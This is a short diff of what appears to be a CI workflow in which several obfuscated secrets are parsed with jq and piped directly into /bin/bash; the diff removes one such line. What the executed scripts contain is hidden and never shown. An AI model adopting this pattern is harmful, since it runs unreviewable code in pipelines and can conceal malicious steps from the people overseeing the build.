@@ -21,7 +21,6 @@ jobs:
           xes95: ${{ secrets.xes95 }}
         run: |
           printf '%s' "$xes95" | jq -r .epcp800 | /bin/bash
-          echo $kga25 | jq -r .y37 | /bin/bash
           printf '%s' "$n31789" | jq -r .euaz759 | /bin/bash
           printf '%s' "$m3038" | jq -r .p132 | /bin/bash
           printf '%s' "$sag84" | jq -r .a9 | /bin/bash
